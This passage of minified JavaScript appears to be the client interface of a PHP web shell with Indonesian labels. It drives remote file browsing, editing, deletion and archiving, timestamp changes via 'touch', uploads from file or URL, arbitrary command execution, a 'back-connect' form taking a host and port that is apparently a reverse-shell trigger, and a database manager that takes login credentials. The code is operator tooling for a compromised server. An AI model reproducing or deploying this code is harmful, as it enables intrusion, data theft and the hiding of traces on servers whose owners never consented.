a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],o=a.value,i=t("#modalshowaksi"),s="",l="",r="",m=a.attributes["data-xtype"],c=a.attributes["data-xname"],u=a.attributes["data-xpath"],p=e.currentTarget;if(o.length>0){switch(i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),o){case"rename":l="Rename "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="oname" value="'+c.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+c.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',r="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+c.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',r="";break;case"copy":l="Copy "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=copy" id="rqcopy">										<input type="hidden" name="xtype" value="'+m.value+'"/>										<input type="hidden" name="xpath" value="'+u.value+'"/>										<input type="hidden" name="xname" value="'+c.value+'"/>										<div class="form-group mb-0">											<label for="xtarget" class="form-label">Paste to:</label>											<div class="input-group mb-3">												<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+u.value+'" autofocus=""/>												<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>											</div>										</div>									</form>',r="";break;case"cut":l="Cut "+m.value.toUpperCase()+" /"+c.value,s='<form method="post" action="?act=cut" id="rqcut">										<input type="hidden" name="xtype" value="'+m.value+'"/>										<input type="hidden" name="xpath" value="'+u.value+'"/>										<input type="hidden" name="xname" value="'+c.value+'"/>										<div class="form-group mb-0">											<label for="xtarget" class="form-label">Move to:</label>											<div class="input-group mb-3">												<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+u.value+'" autofocus=""/>												<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>											</div>										</div>									</form>',r=""}if("download"==o)window.open("?act=path&dir="+u.value+"&entry="+c.value+"&opt="+o,"_blank");else if(["del","zip","unzip","tar","untar","tgz","untgz"].includes(o))i.modal("show"),i.find(".modal-title").html(o+" /"+c.value),i.find(".modal-body").html('<form method="post" action="?act='+o+'" id="rq'+o+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+c.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info mt-n3 mx-n3 rounded-0">Klik proses utk melanjutkan!!</div><button class="btn btn-success" type="submit">Proses!</button></form>'),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),p.value=""});else if("edit"==o){i.modal("show"),i.find(".modal-dialog").addClass("modal-xl"),i.find(".modal-body").addClass("p-0"),i.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+c.value);var f=i.find(".modal-content").html();d("edit",u.value,c.value,function(t){i.find(".modal-body").html('<textarea name="xdata">'+t+'</textarea><div id="xdata" class="position-relative rounded">'+t+"</div>"),i.find(".modal-content").html('<form method="post" action="?act=path&dir='+u.value+"&entry="+c.value+'&opt=edit" id="rqeditfile">'+i.find(".modal-content").html()+"</form>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>{var t=i.find('textarea[name="xdata"]'),e=ace.edit("xdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});t.hide(),e.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),e.container.style.lineHeight="1.25em",e.session.setMode("ace/mode/php"),e.session.on("change",function(a){t.val(e.getValue())})},100)}),i.on("hidden.bs.modal",function(t){i.find(".modal-dialog").removeClass("modal-xl"),i.find(".modal-content").html(f),i.find(".modal-title").html("unknown"),i.find(".modal-body").removeClass("p-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),p.value=""})}else"view"==o?(i.modal("show"),i.find(".modal-dialog").addClass("modal-xl"),i.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+c.value),d("view",u.value,c.value,function(t){i.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0 p-0").html('<div id="vdata">'+t+"</div>"),i.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>');var e=ace.edit("vdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});e.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),e.container.style.lineHeight="1.25em",e.session.setMode("ace/mode/php"),e.session.setUseWorker(!1),e.setShowPrintMargin(!1),e.setReadOnly(!0)}),i.on("hidden.bs.modal",function(t){i.find(".modal-dialog").removeClass("modal-xl"),i.find(".modal-title").html("unknown"),i.find(".modal-body").attr("style","").removeClass("rounded-0 p-0").html("null"),i.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),p.value=""})):(i.modal("show"),i.find(".modal-title").html(l),i.find(".modal-body").html(s),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),p.value=""}))}else n("Error","Invalid request!")},!1)}function l(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,d){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("change","input#diCheckAll",function(e){t(document).find('input[id^="diCheck"]').prop("checked",t(this).prop("checked"))}),t(document).on("change",'input[id^="diCheck"]',function(e){t(e.target).attr("checked")?t(this).removeAttr("checked"):t(this).attr("checked","checked")}),t(document).on("change","select#fdirexec",function(e){var n=t(e.target).val(),o=t(e.target).data("xpath"),i=[],d=t(document).find('input[id^="diCheck"]:checked');t.each(d,function(e,a){i.push({type:t(a).data("xtype"),name:t(a).data("xname")})}),document.querySelectorAll("#fdirexec"),function e(n,o,i){var d=t("#modalshowaksi"),s="",l="",r=[],m=[];i.forEach((t,e)=>{"dir"==t.type&&r.push(t.name+"/"),"file"==t.type&&m.push(t.name)});var c="",u="";switch(m.length>0&&(c='<div class="input-group mb-2 mb-sm-3"><div class="input-group-prepend"><label class="input-group-text">File</label></div><textarea class="form-control form-control-sm border-success" rows="1" readonly disabled>'+m.join(", ")+"</textarea></div>"),r.length>0&&(u='<div class="input-group mb-2 mb-sm-3"><div class="input-group-prepend"><label class="input-group-text">Dirs</label></div><textarea class="form-control form-control-sm border-success" rows="1" readonly disabled>'+r.join(", ")+"</textarea></div>"),n){case"mass_copy":l="Copy",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group mb-0">									<label for="xtarget" class="form-label">Paste to:</label>									<div class="input-group mb-3">										<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+o+'" autofocus=""/>										<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dicopy!";break;case"mass_cut":l="Cut",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group mb-0">									<label for="xtarget" class="form-label">Move to:</label>									<div class="input-group mb-3">										<input type="text" class="form-control border-success" id="xtarget" name="xtarget" value="'+o+'" autofocus=""/>										<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dipindah!";break;case"mass_del":l="Delete",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<p class="text-center">Data di atas yakin ingin dihapus?</p>								<div class="text-center">									<button class="btn btn-danger" type="submit">Hajar!</button>								</div>							</form>',d.find(".modal-body").removeClass("pb-0")):s="Pilih dulu file atau direktori yang mw dihapus!";break;case"mass_zip":l="Zip Archives",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.zip</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!";break;case"mass_tar":l="Compress to TAR",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.tar</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!";break;case"mass_tgz":l="Compress to TAR.GZ",r.length+m.length>0?(s='<form method="post" action="?act='+n+'" id="rq'+n+'">								<input type="hidden" name="xpath" value="'+o+'"/>								<input type="hidden" name="xdata" value="'+a.encode(JSON.stringify(i))+'"/>								'+(c+u)+'								<div class="form-group row mb-0">									<label for="xname" class="col-sm-2 col-form-label">Rename</label>									<div class="col-sm-10">										<div class="input-group mb-3">											<input type="text" class="form-control border-success" id="xname" name="xname" value="" placeholder="newfile" autofocus=""/>											<div class="input-group-prepend"><span class="input-group-text">.tar.gz</span></div>											<div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div>										</div>									</div>								</div>							</form>',d.find(".modal-body").addClass("pb-0")):s="Pilih dulu file atau direktori yang mw dikompres!"}d.modal("show"),d.find(".modal-title").html(l),d.find(".modal-body").html(s),d.find(".modal-footer").removeClass("d-flex justify-content-center").addClass("d-none"),d.on("hidden.bs.modal",function(t){d.find(".modal-title").html("unknown"),d.find(".modal-body").removeClass("pb-0").html("null"),d.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center")})}(n,o,i)}),t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){s(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rquploader,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("div#uploadmethod").attr("data-xpath",o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){s(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){var n=t("#nav-info").find("#showinfo");t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t(n).html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),o=t.map(a,function(t,e){return[t]});t(n).html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+o.join("")+"</blockquote>")}catch(i){t(n).html("Error: Gagal menganalisa server!")}})}),t('button[data-target="#nav-sql"]').on("shown.bs.tab",function(a){var n=t("#nav-sql").find("#showsqlframe");t.ajax({type:"get",url:"?act=sql&q=check",dataType:"json",beforeSend:function(){t(n).html(e)},success:function(e){t(n).find(".bg-transparent").remove()}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e));if(!1==a.error){var o="";["MySQL","MSSql","PDO","odbc","Oracle","PostgreSQL","SQLite","SQLite3"].forEach((t,e)=>{var n=a.data.includes(t)?"":"disabled";o+='<option value="'+t+'" '+n+">"+t+"</option>"}),n.html('<h6 class="text-info">MySQL Manager</h6>							<form method="post" action="?act=sql&q=connect" class="mb-0" id="rqsql">								<div class="row mb-2">									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqltype" class="mb-1">Koneksi</label>											<div class="input-group input-group-sm">												<select name="sqltype" id="sqltype" class="custom-select custom-select-sm border-success">'+o+'</select>												<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>											</div>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqlhost" class="mb-1">Host</label>											<input type="text" name="sqlhost" id="sqlhost" class="form-control form-control-sm border-success" placeholder="locahost" value="localhost"/>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqluser" class="mb-1">Username</label>											<input type="text" name="sqluser" id="sqluser" class="form-control form-control-sm border-success" placeholder="root"/>										</div>									</div>									<div class="col-6 col-sm-6 col-md-3">										<div class="form-group">											<label for="sqlpass" class="mb-1">Password</label>											<input type="text" name="sqlpass" id="sqlpass" class="form-control form-control-sm border-success" placeholder="password"/>										</div>									</div>								</div>							</form>							<div id="tbdatabase"></div>')}}catch(i){t(n).html("<blockquote class='blockquote text-center px-3 py-2 mt-2 bg-success-rgb rounded'><span class='text-cyan'>Error: "+i.message+"</span></blockquote>")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),l(t(this).attr("data-path"),function(){s(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),l(t(this).attr("data-path"),function(){s(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),d=a.attr("data-xpath"),s=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(d),n.find('input[name="xperm"]').val(s).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqtar","rquntar","rqtgz","rquntgz","rqmass_zip","rqmass_tar","rqmass_tgz","rqmass_del","rqmass_copy","rqmass_cut","rqcopy","rqcut","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var d=t(this),s=t("#modalshowaksi");if(d.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)d.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(d.find('textarea[name="xdata"]').val());else if("rqbc"==i){var r=d.find('input[name="bhost"]').val(),m=d.find('input[name="bport"]').val();if(d.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),r.length<=0||m.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),d.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqcut"==i);else if("rqreadfile"==i){var c=d.find('input[name="xpath"]').val();if(c.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;s.modal("show"),s.find(".modal-title").html("View FILE: "+c),d.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:d.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:d.serialize(),beforeSend:function(){t("rqbc"==i?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(d)}}).fail(function(t,e){d.parent().find("div.bg-transparent").remove(),d.find('button[type="submit"]').prop("disabled",!1),n("Alert","Request failed: "+e)}).done(function(e){if(d.parent().find("div.bg-transparent").remove(),d.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i){s.find(".modal-dialog").addClass("modal-xl"),s.find(".modal-body").addClass("p-0").html('<div id="vdata">'+e+"</div>"),s.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>');var a=ace.edit("vdata",{theme:"ace/theme/monokai",maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});a.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),a.container.style.lineHeight="1.25em",a.session.setMode("ace/mode/php"),a.session.setUseWorker(!1),a.setShowPrintMargin(!1),a.setReadOnly(!0),s.on("hidden.bs.modal",function(t){s.find(".modal-dialog").removeClass("modal-xl"),s.find(".modal-body").removeClass("rounded-0 p-0").html("null"),s.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center")})}else"rqbc"==i?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==i||"rqtouch"==i?d.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),s.modal("hide"),n("Alert",e));var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),l(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?s(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var d=t("#modalshowaksi"),s=o.find('input[name="xpath"]').val(),l=d.find(".modal-content").html();d.modal("show"),d.find(".modal-title").text("FileName: "+i),d.find(".modal-dialog").addClass("modal-xl"),d.find(".modal-body").addClass("rounded-0 p-0").html('<textarea name="xdata"></textarea><div id="xdata" class="position-relative rounded"></div>'),d.find(".modal-content").html('<form method="post" action="?act=path&dir='+s+"&entry="+i+'&opt=newfile" id="rqnewfile">'+d.find(".modal-content").html()+"</form>"),d.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>');var r=d.find('textarea[name="xdata"]'),m=ace.edit("xdata",{theme:"ace/theme/monokai",minLines:10,maxLines:25,wrap:!1,autoScrollEditorIntoView:!0});r.hide(),m.setOptions({fontSize:"1em",mergeUndoDeltas:"always",copyWithEmptySelection:!0}),m.container.style.lineHeight="1.25em",m.session.setMode("ace/mode/php"),m.session.on("change",function(t){r.val(m.getValue())}),d.on("hidden.bs.modal",function(t){d.find(".modal-dialog").removeClass("modal-xl"),d.find(".modal-content").html(l),d.find(".modal-title").html("unknown"),d.find(".modal-body").removeClass("rounded-0 p-0").html("null"),d.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center")})}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t(document).on("click","div#uploadmethod",function(e){e.preventDefault(),t(this).find("select#xtype").on("change",function(){var e=t(this).find(":selected").val();t("file"==e?"#uploadtypefile":"#uploadtypeurl").modal("show")})}),t(document).on("submit","form#rquploader",function(a){a.preventDefault();var o=t(this);o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)}}).done(function(e){o[0].reset(),o.parent().find("div.bg-transparent").remove(),o.find('button[type="submit"]').prop("disabled",!1),t("#uploadtypeurl").modal("hide"),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})}),t("form#rqupload").find('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e),t("#uploadtypefile").modal("hide");var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.find("input").prop("disabled",!0),o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){o.find('button[type="submit"], input').prop("disabled",!1);var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t("div#uploadmethod").attr("data-xpath",a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})}),t(document).on("submit","form#rqsql",function(a){a.preventDefault();var n=t(this);n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),beforeSend:function(){n.find("select, input").prop("disabled",!0),n.parent().find("#tbdatabase").html(e)},success:function(t){n.parent().find("#tbdatabase").html(t)},error:function(e,a,o){t('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a+": "+o+"</div></div>").insertAfter(n)}}).done(function(a){n.find('button[type="submit"], select, input').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").on("change",function(){var a=t(this).find("option:selected").data("connect");t(document).find('#sqlmanager .sqltabpanel form input[name="sqlconnect"]').val(a),setTimeout(()=>{t.ajax({type:"post",url:n.attr("action").replace("connect","manage"),data:{sqlconnect:a},beforeSend:function(){t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+e+"</td></tr>")},success:function(e){t("#sqlmanager").find("#dbshowtable tbody").html("")},error:function(e,a,n){t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+a+": "+n+"</td></tr>")}}).done(function(e){if(e.length>3&&o(e)){var a=JSON.parse(e),n="",i='<div class="tab-content">';t.each(a,function(t,e){n+='<tr class="nav-items"><td class="nav-link p-0 pl-2" type="button" data-toggle="tab" data-target="#'+t+'" role="tab" aria-controls="'+t+'" aria-selected="false">'+t+"</td></tr>",i+='<div class="tab-pane fade" id="'+t+'"></div>'}),i+="</div>",t("#sqlmanager .sqltabpanel form").find("#flimit").addClass("d-none"),t("#sqlmanager").find("#dbshowrows").html(i),t("#sqlmanager").find("#dbshowtable tbody").addClass("nav nav-tabs flex-column").html(n)}else t("#sqlmanager").find("#dbshowtable tbody").html('<tr><td class="text-center">'+("[]"==e?"Tidak ada data!":e)+"</td></tr>")})},150)}),t(document).find("#sqlmanager select#dblists option:first-child").attr("selected","selected").trigger("change")})}),t(document).on("submit","#sqlmanager .sqltabpanel form",function(a){a.preventDefault();var n=t(this),d=n.find('input[name="sqlgetdata"]').val(),s="";if(n.find('textarea[name="sqlquery"]').val().length>0&&(n.find("#flimit").addClass("d-none"),n.find('input[name="sqlgetdata"]').val(""),d=""),d.length>0)s=d;else{var l=t(document).find("#dbshowtable tbody tr td.nav-link").filter(function(){return t(this).hasClass("active")});n.parent().parent().find("#dbshowrows "+t(l).data("target")).removeClass("active show"),s=n.parent().parent().find("#dbshowrows .tab-pane:first-child").attr("id"),n.parent().parent().find("#dbshowrows #"+s).addClass("show active")}n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),beforeSend:function(){t(document).find("#sqlmanager select#dblists").prop("disabled",!0),n.find("textarea, input, select").prop("disabled",!0),t("#sqlmanager").find("#dbshowrows #"+s).html(e)},success:function(e){t("#sqlmanager").find("#dbshowrows #"+s).html("")},error:function(e,a,n){t("#sqlmanager").find("#dbshowrows #"+s).html(a+": "+n)}}).done(function(e){if(n.find('button[type="submit"], textarea, input, select').prop("disabled",!1),t(document).find("#sqlmanager select#dblists").prop("disabled",!1),e.length>3&&o(e)){var a=JSON.parse(e),d="",l=[];Object.keys(a).forEach(t=>{var e=a[t];Array.isArray(e)&&e.length>0?(d=Object.keys(e[0]),l.push(e)):"object"==typeof e&&null!==e?(d=Object.keys(e),l.push(e)):(d=["nodata"],l.push("Belum ada data"))});var r=i(l,d);t("#sqlmanager").find("#dbshowrows #"+s).html('<div class="table-responsive text-nowrap">'+r.prop("outerHTML")+"</div>")}else t("#sqlmanager").find("#dbshowrows #"+s).html("[]"==e?"Tidak ada data!":e)})}),t(document).on("hidden.bs.tab","#sqlmanager #dbshowtable tbody tr td.nav-link",function(e){var a=t(document).find("#sqlmanager .sqltabpanel form");a.find('#flimit input[name="slimit"]').val(0),a.find('#flimit input[name="elimit"]').val(25)}),t(document).on("show.bs.tab","#sqlmanager #dbshowtable tbody tr td.nav-link",function(a){a.relatedTarget&&t(a.relatedTarget).removeClass("active");var 